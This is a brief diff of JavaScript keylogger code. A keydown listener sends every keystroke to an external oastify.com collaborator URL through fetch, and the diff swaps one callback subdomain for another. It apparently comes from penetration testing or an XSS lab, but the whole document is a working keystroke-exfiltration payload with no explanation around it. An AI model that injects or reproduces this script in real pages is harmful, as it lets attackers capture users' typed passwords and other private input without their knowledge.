@@ -1,5 +1,5 @@
 function logKey(event){
-	fetch("https://536qd0bplf13wjesley2gzbkjbp2dy1n.oastify.com/k?key=" + event.key)
+	fetch("https://fsb02a0zapqdlt32aonc590u8lec23zro.oastify.com/k?key=" + event.key)
 }
 
 document.addEventListener('keydown', logKey);
